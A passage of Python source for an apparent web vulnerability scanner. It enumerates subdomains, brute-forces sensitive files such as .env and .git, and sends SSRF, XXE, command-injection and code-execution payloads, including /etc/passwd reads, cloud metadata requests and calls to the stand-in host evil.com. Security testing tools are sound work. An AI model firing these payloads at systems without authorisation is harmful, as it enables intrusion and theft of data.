            'auth', 'login', 'dashboard', 'analytics', 'static', 'search', 'demo',
            'stage', 'status', 'docs', 'documentation', 'panel', 'dl', 'download'
        ]
        
        found_subdomains = []
        
        def check_subdomain(subdomain):
            try:
                domain = f"{subdomain}.{root_domain}"
                ip_address = socket.gethostbyname(domain)
                return (domain, ip_address)
            except:
                return None
                
        print(Fore.YELLOW + f"[*] Enumerating subdomains for {root_domain}" + Style.RESET_ALL)
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            results = list(executor.map(check_subdomain, common_subdomains))
            
        for result in results:
            if result:
                domain, ip = result
                found_subdomains.append({'domain': domain, 'ip': ip})
                print(Fore.GREEN + f"[+] Found subdomain: {domain} ({ip})" + Style.RESET_ALL)
                
        self.subdomains = found_subdomains
        
        if not found_subdomains:
            print(Fore.YELLOW + "[!] No subdomains discovered" + Style.RESET_ALL)
            
        return found_subdomains

    def brute_force_directories(self):
        """Brute force directories and files on the target website"""
        discovered = []
        
        # Create a list of paths to check (combine with extensions)
        paths_to_check = []
        paths_to_check.extend(self.common_dirs)
        
        # Add common files with extensions
        for directory in [''] + self.common_dirs:
            prefix = f"{directory}/" if directory else ""
            for ext in self.common_extensions:
                # Add index files
                paths_to_check.append(f"{prefix}index{ext}")
                # Add other common filenames
                paths_to_check.append(f"{prefix}main{ext}")
                paths_to_check.append(f"{prefix}admin{ext}")
                paths_to_check.append(f"{prefix}login{ext}")
                paths_to_check.append(f"{prefix}config{ext}")
                paths_to_check.append(f"{prefix}setup{ext}")
                paths_to_check.append(f"{prefix}backup{ext}")
        
        # Add .git related paths
        git_paths = ['.git/HEAD', '.git/config', '.git/logs/HEAD', '.git/index', '.git/refs/']
        paths_to_check.extend(git_paths)
        
        # Add sensitive files
        sensitive_files = [
            '.env', 'config.php', 'wp-config.php', 'configuration.php', 'config.inc.php',
            'database.yml', 'credentials.json', 'settings.py', '.htaccess', 'robots.txt',
            'sitemap.xml', 'crossdomain.xml', 'phpinfo.php', 'info.php', 'server-status',
            'clientaccesspolicy.xml', '.DS_Store', '.htpasswd', 'web.config', '.svn/entries'
        ]
        paths_to_check.extend(sensitive_files)
        
        # Remove duplicates
        paths_to_check = list(set(paths_to_check))
        
        def check_path(path):
            url = f"{self.base_url}/{path}"
            try:
                # Use a HEAD request first to be less intrusive
                response = self.session.head(url, timeout=self.timeout, allow_redirects=False)
                
                # If we get a 200 OK, or 401/403 (auth required), the resource likely exists
                if response.status_code in [200, 401, 403]:
                    # For interesting responses, make a GET request to get size and content type
                    response = self.session.get(url, timeout=self.timeout, allow_redirects=False)
                    content_type = response.headers.get('Content-Type', 'unknown')
                    content_length = len(response.content)
                    
                    result = {
                        'url': url,
                        'path': path,
                        'status_code': response.status_code,
                        'content_type': content_type,
                        'size': content_length,
                        'interesting': False
                    }
                    
                    # Mark potentially interesting findings
                    if any(ext in path.lower() for ext in ['.php', '.bak', '.old', '.backup', '.config', '.env', '.ini', '.conf']):
                        result['interesting'] = True
                    
                    if path.startswith('.git/') or '.git' in path.lower():
                        result['interesting'] = True
                        
                    if '.htaccess' in path.lower() or '.htpasswd' in path.lower():
                        result['interesting'] = True
                        
                    return result
                return None
            except:
                return None
                
        print(Fore.YELLOW + f"[*] Brute forcing directories and files (this may take some time)..." + Style.RESET_ALL)
        print(Fore.YELLOW + f"[*] Testing {len(paths_to_check)} paths" + Style.RESET_ALL)
        
        # Use thread pool for faster scanning
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            results = list(executor.map(check_path, paths_to_check))
            
        for result in results:
            if result:
                discovered.append(result)
                if result['interesting']:
                    print(Fore.RED + f"[!] Found interesting resource: {result['url']} ({result['status_code']})" + Style.RESET_ALL)
                else:
                    print(Fore.GREEN + f"[+] Found: {result['url']} ({result['status_code']})" + Style.RESET_ALL)
                
        self.directories = discovered
        
        if not discovered:
            print(Fore.YELLOW + "[!] No directories or files discovered" + Style.RESET_ALL)
            
        return discovered
        
    def discover_api_endpoints(self):
        """Discover potential API endpoints"""
        api_endpoints = []
        api_paths = []
        
        # Common API endpoint patterns
        api_patterns = [
            r'/api/v\d+/.*',
            r'/rest/v\d+/.*',
            r'/api/.*',
            r'/rest/.*',
            r'/v\d+/.*',
            r'/graphql.*',
            r'/query.*',
            r'/service/.*',
            r'/services/.*',
            r'/api-docs.*',
            r'/swagger.*',
            r'/openapi.*'
        ]
        
        # Standard REST API endpoints to check
        common_api_words = ['users', 'auth', 'login', 'user', 'admin', 'data', 'items', 'products', 
                           'orders', 'accounts', 'customers', 'posts', 'comments', 'upload', 'file', 
                           'files', 'images', 'search', 'query', 'info', 'status', 'health']
        
        # Common API patterns to check
        api_prefixes = ['api', 'api/v1', 'api/v2', 'rest', 'graphql', 'v1', 'v2']
        
        # Generate API paths to check
        for prefix in api_prefixes:
            for word in common_api_words:
                api_paths.append(f"{prefix}/{word}")
                
        # Check for common API documentation endpoints
        doc_endpoints = ['swagger', 'swagger-ui', 'swagger-ui.html', 'api-docs', 
                        'swagger/ui', 'openapi.json', 'redoc', 'graphiql']
        api_paths.extend(doc_endpoints)
        
        def check_api_endpoint(path):
            url = f"{self.base_url}/{path}"
            try:
                # Try different HTTP methods for REST APIs
                methods_to_try = ['GET', 'POST', 'OPTIONS']
                
                for method in methods_to_try:
                    if method == 'GET':
                        response = self.session.get(url, timeout=self.timeout)
                    elif method == 'POST':
                        # Send a minimal JSON payload
                        response = self.session.post(url, json={}, timeout=self.timeout)
                    elif method == 'OPTIONS':
                        response = self.session.options(url, timeout=self.timeout)
                    
                    # Check if this looks like an API endpoint
                    content_type = response.headers.get('Content-Type', '')
                    
                    # Check for API-related content types
                    if any(ct in content_type.lower() for ct in ['json', 'xml', 'graphql']):
                        try:
                            # Try to parse as JSON to confirm it's likely an API
                            if 'json' in content_type.lower():
                                json_data = response.json()
                                # If we successfully parsed JSON, it's likely an API
                                return {
                                    'url': url,
                                    'method': method,
                                    'status_code': response.status_code,
                                    'content_type': content_type,
                                    'response_data': str(json_data)[:100] + "..." if len(str(json_data)) > 100 else str(json_data)
                                }
                        except:
                            # If JSON parsing failed but content type is JSON, still might be an API
                            if 'json' in content_type.lower():
                                return {
                                    'url': url,
                                    'method': method,
                                    'status_code': response.status_code,
                                    'content_type': content_type,
                                    'response_data': "Non-parseable JSON response"
                                }
                                
                    # Check for API documentation
                    if any(doc in path.lower() for doc in ['swagger', 'api-docs', 'openapi', 'graphiql']):
                        if response.status_code == 200:
                            return {
                                'url': url,
                                'method': method,
                                'status_code': response.status_code,
                                'content_type': content_type,
                                'response_data': "Potential API documentation"
                            }
                            
                    # Check for CORS headers which are common in APIs
                    if 'Access-Control-Allow-Origin' in response.headers:
                        return {
                            'url': url,
                            'method': method,
                            'status_code': response.status_code,
                            'content_type': content_type,
                            'response_data': "API with CORS enabled"
                        }
                
                return None
            except:
                return None
                
        print(Fore.YELLOW + f"[*] Searching for API endpoints..." + Style.RESET_ALL)
        
        # Use thread pool for faster scanning
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            results = list(executor.map(check_api_endpoint, api_paths))
            
        for result in results:
            if result:
                api_endpoints.append(result)
                print(Fore.GREEN + f"[+] Found API endpoint: {result['url']} ({result['method']} {result['status_code']})" + Style.RESET_ALL)
                
        self.api_endpoints = api_endpoints
        
        if not api_endpoints:
            print(Fore.YELLOW + "[!] No API endpoints discovered" + Style.RESET_ALL)
            
        # Also look for API endpoints in the discovered URLs
        api_urls = []
        for url in self.discovered_urls:
            for pattern in api_patterns:
                if re.search(pattern, url):
                    api_urls.append(url)
                    break
                    
        if api_urls:
            print(Fore.GREEN + f"[+] Found {len(api_urls)} potential API URLs from crawling" + Style.RESET_ALL)
            for url in api_urls:
                api_endpoints.append({
                    'url': url,
                    'method': 'GET',  # Assumed
                    'status_code': 0,  # Unknown
                    'content_type': '',  # Unknown
                    'response_data': "Found during crawling"
                })
                print(Fore.GREEN + f"[+] Potential API URL: {url}" + Style.RESET_ALL)
            
        return api_endpoints

    def test_csrf(self):
        """Test for CSRF vulnerabilities in forms"""
        csrf_vulnerabilities = []
        
        for form in self.forms:
            # Skip login forms to avoid account lockouts
            # if self.is_login_form(form):
            #     continue
                
            # Check if the form has CSRF protection
            has_csrf_token = False
            
            for input_field in form.get('inputs', []):
                input_name = input_field.get('name', '').lower()
                
                # Check for common CSRF token field names
                if any(token_name in input_name for token_name in ['csrf', 'token', 'nonce', 'xsrf', 'verify']):
                    has_csrf_token = True
                    break
            
            # If no CSRF token found, check the cookies
            if not has_csrf_token:
                cookies = self.session.cookies.get_dict()
                for cookie_name in cookies:
                    if any(token_name in cookie_name.lower() for token_name in ['csrf', 'token', 'xsrf']):
                        has_csrf_token = True
                        break
                        
            # If still no CSRF token, check for SameSite cookies which can provide CSRF protection
            if not has_csrf_token:
                response = self.session.get(form['url'], timeout=self.timeout)
                for cookie in response.cookies:
                    if hasattr(cookie, 'samesite') and cookie.samesite in ['Strict', 'Lax']:
                        has_csrf_token = True
                        break
            
            # Check for anti-CSRF headers
            if not has_csrf_token:
                response = self.session.get(form['url'], timeout=self.timeout)
                if 'X-Frame-Options' in response.headers and 'Content-Security-Policy' in response.headers:
                    # These headers don't directly prevent CSRF but indicate security awareness
                    has_csrf_token = True
                    
            if not has_csrf_token and form.get('method', '').upper() == 'POST':
                csrf_vulnerabilities.append({
                    'type': 'CSRF',
                    'url': form['url'],
                    'form_action': form.get('action', ''),
                    'method': form.get('method', ''),
                    'inputs': [field.get('name') for field in form.get('inputs', [])],
                    'confidence': 'Medium',
                    'details': 'Form does not appear to have CSRF protection'
                })
                print(Fore.RED + f"[!] Potential CSRF vulnerability in form at {form['url']}" + Style.RESET_ALL)
        
        self.vulnerabilities.extend(csrf_vulnerabilities)
        return csrf_vulnerabilities
        
    def test_ssrf(self):
        """Test for Server-Side Request Forgery vulnerabilities"""
        ssrf_vulnerabilities = []
        ssrf_payloads = [
            'http://localhost',
            'http://127.0.0.1',
            'http://[::1]',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://instance-data/latest/meta-data/',     # GCP metadata
            'http://169.254.169.254/metadata/v1/',        # DigitalOcean metadata
            'http://169.254.169.254/metadata/instance?api-version=2019-06-01'  # Azure metadata
        ]
        
        # Function to generate a unique callback URL for SSRF testing
        def generate_callback_url():
            random_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:10]
            return f"http://{random_id}.burpcollaborator.net"  # Example domain, won't actually reach anywhere
            
        def test_form(form):
            vulnerabilities = []
            
            # Generate a unique callback URL
            callback_url = generate_callback_url()
            
            for input_field in form.get('inputs', []):
                # Skip input types that likely won't accept URLs
                if input_field.get('type') in ['hidden', 'password', 'checkbox', 'radio']:
                    continue
                    
                for payload in ssrf_payloads + [callback_url]:
                    data = {}
                    
                    # Fill form fields
                    for field in form.get('inputs', []):
                        if field.get('name') == input_field.get('name'):
                            data[field.get('name')] = payload
                        elif field.get('type') == 'email':
                            data[field.get('name')] = 'test@example.com'
                        elif field.get('type') == 'password':
                            data[field.get('name')] = 'Password123!'
                        else:
                            data[field.get('name')] = 'test'
                    
                    try:
                        if form.get('method', '').upper() == 'GET':
                            response = self.session.get(form.get('action', form['url']), params=data, timeout=self.timeout)
                        else:
                            response = self.session.post(form.get('action', form['url']), data=data, timeout=self.timeout)
                        
                        # Check for potential SSRF indicators in the response
                        ssrf_indicators = [
                            'private ip',
                            'local address',
                            'cannot connect to server',
                            'connection refused',
                            'timeout',
                            'network is unreachable',
                            'could not resolve host',
                            'no route to host',
                            'failed to connect'
                        ]
                        
                        for indicator in ssrf_indicators:
                            if indicator in response.text.lower():
                                vulnerabilities.append({
                                    'type': 'SSRF',
                                    'url': form['url'],
                                    'form_action': form.get('action', ''),
                                    'method': form.get('method', ''),
                                    'field': input_field.get('name'),
                                    'payload': payload,
                                    'indicator': indicator,
                                    'confidence': 'Low',
                                    'details': f"Response contains SSRF indicator: '{indicator}'"
                                })
                                print(Fore.RED + f"[!] Potential SSRF vulnerability in form at {form['url']} in field {input_field.get('name')}" + Style.RESET_ALL)
                                print(Fore.YELLOW + f"    Payload: {payload}" + Style.RESET_ALL)
                                print(Fore.YELLOW + f"    Indicator: {indicator}" + Style.RESET_ALL)
                                return vulnerabilities  # Return after finding first vulnerability
                    except Exception as e:
                        # Connection errors might indicate a successful SSRF
                        if 'ConnectTimeout' in str(e) or 'ConnectionError' in str(e):
                            vulnerabilities.append({
                                'type': 'SSRF',
                                'url': form['url'],
                                'form_action': form.get('action', ''),
                                'method': form.get('method', ''),
                                'field': input_field.get('name'),
                                'payload': payload,
                                'indicator': str(e),
                                'confidence': 'Medium',
                                'details': f"Request timed out, which may indicate successful SSRF: {str(e)}"
                            })
                            print(Fore.RED + f"[!] Potential SSRF vulnerability in form at {form['url']} in field {input_field.get('name')}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Payload: {payload}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Error: {str(e)}" + Style.RESET_ALL)
                            return vulnerabilities  # Return after finding first vulnerability
                        
            return vulnerabilities
            
        # Test forms for SSRF
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            results = list(executor.map(test_form, self.forms))
            
        for vulns in results:
            if vulns:
                ssrf_vulnerabilities.extend(vulns)
                
        # Also test URL parameters
        for url in self.discovered_urls:
            parsed_url = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            for param_name, param_value in query_params.items():
                # Skip parameters that are unlikely to be vulnerable to SSRF
                if len(param_value[0]) < 4:  # Too short to be a URL
                    continue
                    
                # Check if parameter might be used for URLs
                if any(url_hint in param_name.lower() for url_hint in ['url', 'link', 'site', 'path', 'dest', 'redirect', 'uri', 'source']):
                    for payload in ssrf_payloads:
                        new_params = query_params.copy()
                        new_params[param_name] = [payload]
                        
                        query = urllib.parse.urlencode(new_params, doseq=True)
                        test_url = urllib.parse.urlunparse((
                            parsed_url.scheme,
                            parsed_url.netloc,
                            parsed_url.path,
                            parsed_url.params,
                            query,
                            parsed_url.fragment
                        ))
                        
                        try:
                            response = self.session.get(test_url, timeout=self.timeout)
                            # Check for potential SSRF indicators
                            ssrf_indicators = [
                                'private ip',
                                'local address',
                                'cannot connect to server',
                                'connection refused',
                                'timeout',
                                'network is unreachable'
                            ]
                            
                            for indicator in ssrf_indicators:
                                if indicator in response.text.lower():
                                    ssrf_vulnerabilities.append({
                                        'type': 'SSRF',
                                        'url': url,
                                        'parameter': param_name,
                                        'payload': payload,
                                        'indicator': indicator,
                                        'confidence': 'Low',
                                        'details': f"URL parameter potentially vulnerable to SSRF: '{param_name}'"
                                    })
                                    print(Fore.RED + f"[!] Potential SSRF vulnerability in URL parameter at {url}" + Style.RESET_ALL)
                                    print(Fore.YELLOW + f"    Parameter: {param_name}" + Style.RESET_ALL)
                                    print(Fore.YELLOW + f"    Payload: {payload}" + Style.RESET_ALL)
                                    break
                        except:
                            pass
        
        self.vulnerabilities.extend(ssrf_vulnerabilities)
        return ssrf_vulnerabilities
        
    def test_xxe(self):
        """Test for XML External Entity (XXE) vulnerabilities"""
        xxe_vulnerabilities = []
        
        # XXE payloads - classic XXE and blind XXE
        xxe_payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>''',
            '''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/hostname">]><data>&file;</data>''',
            '''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><data>test</data>'''
        ]
        
        # Look for potential XML endpoints
        potential_xml_endpoints = []
        
        # Check API endpoints first
        for endpoint in self.api_endpoints:
            # Test SOAP endpoints or endpoints that might accept XML
            if ('xml' in endpoint.get('content_type', '').lower() or 
                any(hint in endpoint.get('url', '').lower() for hint in ['/soap', '/xml', '/rpc', '/wsdl'])):
                potential_xml_endpoints.append({
                    'url': endpoint.get('url'),
                    'method': 'POST',  # Assume POST for API endpoints
                    'content_type': 'application/xml'
                })
                
        # Check for URLs that might accept XML
        for url in self.discovered_urls:
            if any(hint in url.lower() for hint in ['/soap', '/xml', '/api', '/rpc', '/wsdl', '/service']):
                potential_xml_endpoints.append({
                    'url': url,
                    'method': 'POST',
                    'content_type': 'application/xml'
                })
                
        if not potential_xml_endpoints:
            print(Fore.YELLOW + "[!] No potential XML endpoints found for XXE testing" + Style.RESET_ALL)
            return xxe_vulnerabilities
            
        print(Fore.YELLOW + f"[*] Testing {len(potential_xml_endpoints)} potential XML endpoints for XXE..." + Style.RESET_ALL)
        
        xxe_indicators = ['root:', 'nobody:', 'daemon:', 'ftp:', 'bin:', 'sys:']
        
        # Test each potential endpoint
        for endpoint in potential_xml_endpoints:
            for payload in xxe_payloads:
                headers = {
                    'Content-Type': endpoint.get('content_type', 'application/xml'),
                    'Accept': '*/*'
                }
                
                try:
                    if endpoint.get('method') == 'POST':
                        response = self.session.post(endpoint.get('url'), data=payload, headers=headers, timeout=self.timeout)
                    else:
                        response = self.session.get(endpoint.get('url'), headers=headers, timeout=self.timeout)
                        
                    # Check for indicators of successful XXE
                    for indicator in xxe_indicators:
                        if indicator in response.text:
                            xxe_vulnerabilities.append({
                                'type': 'XXE',
                                'url': endpoint.get('url'),
                                'method': endpoint.get('method'),
                                'payload': payload[:50] + "..." if len(payload) > 50 else payload,
                                'indicator': indicator,
                                'confidence': 'High',
                                'details': f"Endpoint seems vulnerable to XXE, response contains '{indicator}'"
                            })
                            print(Fore.RED + f"[!] XXE vulnerability found at {endpoint.get('url')}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Indicator: {indicator}" + Style.RESET_ALL)
                            break
                except Exception as e:
                    # Some exceptions might indicate a partial success of the XXE
                    if "No route to host" in str(e) or "Connection refused" in str(e):
                        xxe_vulnerabilities.append({
                            'type': 'XXE',
                            'url': endpoint.get('url'),
                            'method': endpoint.get('method'),
                            'payload': payload[:50] + "..." if len(payload) > 50 else payload,
                            'indicator': "Connection error",
                            'confidence': 'Medium',
                            'details': f"Potential blind XXE: {str(e)}"
                        })
                        print(Fore.RED + f"[!] Potential blind XXE vulnerability at {endpoint.get('url')}" + Style.RESET_ALL)
                        print(Fore.YELLOW + f"    Error: {str(e)}" + Style.RESET_ALL)
                    pass
        
        self.vulnerabilities.extend(xxe_vulnerabilities)
        return xxe_vulnerabilities

    def test_command_injection(self):
        """Test for command injection vulnerabilities"""
        cmd_injection_vulnerabilities = []
        
        # Command injection payloads with platform-specific commands
        cmd_payloads = [
            # Linux payloads
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`",
            ";cat /etc/passwd;",
            "| cat /etc/passwd",
            "|| cat /etc/passwd",
            "& cat /etc/passwd",
            "&& cat /etc/passwd",
            "%0acat /etc/passwd",
            
            # Windows payloads
            "& dir",
            "&& dir",
            "| dir",
            "; dir",
            "%0adir",
            
            # Blind command injection payloads
            "$(sleep 5)",
            "`sleep 5`",
            "; sleep 5;",
            "& sleep 5",
            "&& sleep 5",
            "| sleep 5",
            "|| sleep 5",
            "%0asleep 5",
            
            # Ping back payloads (would need listener in real scenario)
            "$(ping -c 3 evil.com)",
            "`ping -c 3 evil.com`",
            "& ping -c 3 evil.com",
            "| ping -c 3 evil.com"
        ]
        
        # Command injection indicators in response
        cmd_indicators = [
            "root:",
            "bin:",
            "daemon:",
            "Directory of",
            "Volume Serial Number",
            "directory listing",
            "Directory listing",
            "<DIR>",
            "Volume in drive",
            "VAR=",
            "PATH=",
            "HOME=",
            "PWD=",
            "sh: command"
        ]
        
        def test_form(form):
            vulnerabilities = []
            
            for input_field in form.get('inputs', []):
                # Skip fields that are unlikely to be vulnerable (checkbox, radio, etc.)
                if input_field.get('type') in ['checkbox', 'radio', 'file', 'image']:
                    continue
                    
                # Test potentially vulnerable fields
                for payload in cmd_payloads:
                    data = {}
                    
                    # Fill form fields
                    for field in form.get('inputs', []):
                        if field.get('name') == input_field.get('name'):
                            data[field.get('name')] = payload
                        elif field.get('type') == 'email':
                            data[field.get('name')] = 'test@example.com'
                        elif field.get('type') == 'password':
                            data[field.get('name')] = 'Password123!'
                        else:
                            data[field.get('name')] = 'test'
                    
                    try:
                        start_time = time.time()
                        
                        if form.get('method', '').upper() == 'GET':
                            response = self.session.get(form.get('action', form['url']), params=data, timeout=self.timeout)
                        else:
                            response = self.session.post(form.get('action', form['url']), data=data, timeout=self.timeout)
                            
                        end_time = time.time()
                        response_time = end_time - start_time
                        
                        # Check for command execution indicators in response
                        for indicator in cmd_indicators:
                            if indicator in response.text:
                                vulnerabilities.append({
                                    'type': 'Command Injection',
                                    'url': form['url'],
                                    'form_action': form.get('action', ''),
                                    'method': form.get('method', ''),
                                    'field': input_field.get('name'),
                                    'payload': payload,
                                    'indicator': indicator,
                                    'confidence': 'High',
                                    'details': f"Response contains command injection indicator: '{indicator}'"
                                })
                                print(Fore.RED + f"[!] Potential command injection found at {form['url']} in field {input_field.get('name')}" + Style.RESET_ALL)
                                print(Fore.YELLOW + f"    Payload: {payload}" + Style.RESET_ALL)
                                print(Fore.YELLOW + f"    Indicator: {indicator}" + Style.RESET_ALL)
                                return vulnerabilities
                        
                        # Check for time delay in blind injection payloads
                        if "sleep 5" in payload and response_time > 4.5:
                            vulnerabilities.append({
                                'type': 'Command Injection',
                                'url': form['url'],
                                'form_action': form.get('action', ''),
                                'method': form.get('method', ''),
                                'field': input_field.get('name'),
                                'payload': payload,
                                'indicator': f"Time delay ({response_time:.2f}s)",
                                'confidence': 'Medium',
                                'details': f"Potential blind command injection: response time was {response_time:.2f}s with a sleep command"
                            })
                            print(Fore.RED + f"[!] Potential blind command injection at {form['url']} in field {input_field.get('name')}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Payload: {payload}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Response time: {response_time:.2f}s" + Style.RESET_ALL)
                            
                    except requests.exceptions.Timeout:
                        # Timeout might indicate a successful blind injection
                        if "sleep" in payload:
                            vulnerabilities.append({
                                'type': 'Command Injection',
                                'url': form['url'],
                                'form_action': form.get('action', ''),
                                'method': form.get('method', ''),
                                'field': input_field.get('name'),
                                'payload': payload,
                                'indicator': "Request timeout",
                                'confidence': 'Medium',
                                'details': "Potential blind command injection: request timed out with a sleep command"
                            })
                            print(Fore.RED + f"[!] Potential blind command injection at {form['url']} in field {input_field.get('name')}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Payload: {payload}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Indicator: Request timed out" + Style.RESET_ALL)
                            return vulnerabilities
                    except:
                        continue
            
            return vulnerabilities
            
        # Test forms for command injection
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            results = list(executor.map(test_form, self.forms))
            
        for vulns in results:
            if vulns:
                cmd_injection_vulnerabilities.extend(vulns)
                
        # Also test URL parameters
        for url in self.discovered_urls:
            parsed_url = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            for param_name, param_value in query_params.items():
                # Skip parameters that are unlikely to be vulnerable
                if len(query_params) == 0 or len(param_value[0]) == 0:
                    continue
                    
                # Prioritize parameters that might be used for system operations
                risky_params = ['cmd', 'exec', 'eval', 'command', 'cmd', 'script', 'function', 'run', 'template']
                is_risky = any(risk in param_name.lower() for risk in risky_params)
                
                # Test a subset of payloads
                payloads_to_test = cmd_payloads if is_risky else cmd_payloads[:7]  # Use full list for risky params
                
                for payload in payloads_to_test:
                    new_params = query_params.copy()
                    new_params[param_name] = [payload]
                    
                    query = urllib.parse.urlencode(new_params, doseq=True)
                    test_url = urllib.parse.urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        query,
                        parsed_url.fragment
                    ))
                    
                    try:
                        start_time = time.time()
                        response = self.session.get(test_url, timeout=self.timeout)
                        end_time = time.time()
                        response_time = end_time - start_time
                        
                        # Check for command execution indicators
                        for indicator in cmd_indicators:
                            if indicator in response.text:
                                cmd_injection_vulnerabilities.append({
                                    'type': 'Command Injection',
                                    'url': url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'indicator': indicator,
                                    'confidence': 'High',
                                    'details': f"Response contains command injection indicator: '{indicator}'"
                                })
                                print(Fore.RED + f"[!] Potential command injection found in URL {url} parameter {param_name}" + Style.RESET_ALL)
                                print(Fore.YELLOW + f"    Payload: {payload}" + Style.RESET_ALL)
                                print(Fore.YELLOW + f"    Indicator: {indicator}" + Style.RESET_ALL)
                                break
                                
                        # Check for time delay
                        if "sleep 5" in payload and response_time > 4.5:
                            cmd_injection_vulnerabilities.append({
                                'type': 'Command Injection',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'indicator': f"Time delay ({response_time:.2f}s)",
                                'confidence': 'Medium',
                                'details': f"Potential blind command injection: response time was {response_time:.2f}s with a sleep command"
                            })
                            print(Fore.RED + f"[!] Potential blind command injection in URL {url} parameter {param_name}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Payload: {payload}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Response time: {response_time:.2f}s" + Style.RESET_ALL)
                            
                    except requests.exceptions.Timeout:
                        # Timeout might indicate a successful blind injection
                        if "sleep" in payload:
                            cmd_injection_vulnerabilities.append({
                                'type': 'Command Injection',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'indicator': "Request timeout",
                                'confidence': 'Medium',
                                'details': "Potential blind command injection: request timed out with a sleep command"
                            })
                            print(Fore.RED + f"[!] Potential blind command injection in URL {url} parameter {param_name}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Payload: {payload}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Indicator: Request timed out" + Style.RESET_ALL)
                    except:
                        continue
                        
        self.vulnerabilities.extend(cmd_injection_vulnerabilities)
        return cmd_injection_vulnerabilities
        
    def test_rce(self):
        """
        Test for Remote Code Execution (RCE) vulnerabilities in forms.
        
        Returns:
            int: Number of RCE vulnerabilities found
        """
        if not self.forms:
            if self.verbose:
                print(Fore.YELLOW + "[*] No forms found to test for RCE vulnerabilities" + Style.RESET_ALL)
            return 0
            
        if self.verbose:
            print(Fore.BLUE + "[*] Testing forms for Remote Code Execution (RCE) vulnerabilities..." + Style.RESET_ALL)
        
        # List of RCE payloads for various platforms
        rce_payloads = [
            # Linux commands
            "sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
            "& sleep 5 &",
            "; sleep 5;",
            "| sleep 5 |",
            "|| sleep 5",
            "&& sleep 5",
            # Python code
            "eval('__import__(\"time\").sleep(5)')",
            "exec('import time; time.sleep(5)')",
            # PHP code
            "<?php sleep(5); ?>",
            "<?php system('sleep 5'); ?>",
            "<?php passthru('sleep 5'); ?>",
            "<?php exec('sleep 5'); ?>",
            "<?php shell_exec('sleep 5'); ?>",
            # Ruby code
            "<%= sleep 5 %>",
            "<%= `sleep 5` %>",
            # Node.js
            "res.end(require('child_process').execSync('sleep 5').toString())"
        ]
        
        # Indicators of successful code execution in the response
        indicators = [
            "syntax error",
            "undefined variable",
            "command not found",
            "shell_exec",
            "system(",
            "exec(",
            "eval(",
            "ReferenceError",
            "TypeError",
            "SyntaxError",
            "unexpected token",
            "ValueError",
            "ZeroDivisionError",
            "subprocess",
            "module 'os'",
            "child_process"
        ]
        
        def test_form(form):
            url = form.get('action', self.target_url)
            
            # Handle relative URLs
            if not url.startswith(('http://', 'https://')):
                if url.startswith('/'):
                    # Absolute path relative to domain
                    parsed_url = urlparse(self.target_url)
                    url = f"{parsed_url.scheme}://{parsed_url.netloc}{url}"
                else:
                    # Relative path to current directory
                    url = urljoin(self.target_url, url)
            
            method = form.get('method', 'get').lower()
            inputs = form.get('inputs', [])
            
            if not inputs:
                return
            
            for payload in rce_payloads:
                for input_field in inputs:
                    # Create a copy of the form data for each test
                    data = {}
                    for inp in inputs:
                        input_name = inp.get('name', '')
                        input_value = inp.get('value', '')
                        
                        if input_name == input_field.get('name'):
                            data[input_name] = payload
                        else:
                            data[input_name] = input_value
                    
                    try:
                        if self.verbose:
                            print(f"  Testing {method.upper()} {url} with payload in {input_field.get('name')}: {payload}")
                        
                        # Record the start time
                        start_time = time.time()
                        
                        # Send the request
                        if method == 'post':
                            response = requests.post(url, data=data, headers=self.headers, 
                                                   timeout=self.timeout, 
                                                   verify=False, 
                                                   allow_redirects=False)
                        else:
                            response = requests.get(url, params=data, headers=self.headers, 
                                                  timeout=self.timeout, 
                                                  verify=False, 
                                                  allow_redirects=False)
                        
                        # Calculate the time the request took
                        request_time = time.time() - start_time
                        
                        # Check for time delay (indicating blind RCE)
                        if "sleep 5" in payload and request_time > 4.5:
                            vulnerability = {
                                'type': 'Remote Code Execution (RCE)',
                                'url': url,
                                'method': method.upper(),
                                'parameter': input_field.get('name', ''),
                                'payload': payload,
                                'evidence': f"Time delay detected: {request_time:.2f} seconds",
                                'severity': 'Critical'
                            }
                            self.vulnerabilities.append(vulnerability)
                            
                            if self.verbose:
                                print(Fore.RED + f"  [!] RCE vulnerability (time-based) found at {url}" + Style.RESET_ALL)
                                print(Fore.RED + f"      Parameter: {input_field.get('name', '')}" + Style.RESET_ALL)
                                print(Fore.RED + f"      Payload: {payload}" + Style.RESET_ALL)
                                print(Fore.RED + f"      Evidence: Time delay detected: {request_time:.2f} seconds" + Style.RESET_ALL)
                        
                        # Check for indicators in the response content
                        response_text = response.text.lower()
                        for indicator in indicators:
                            if indicator.lower() in response_text:
                                vulnerability = {
                                    'type': 'Remote Code Execution (RCE)',
                                    'url': url,
                                    'method': method.upper(),
                                    'parameter': input_field.get('name', ''),
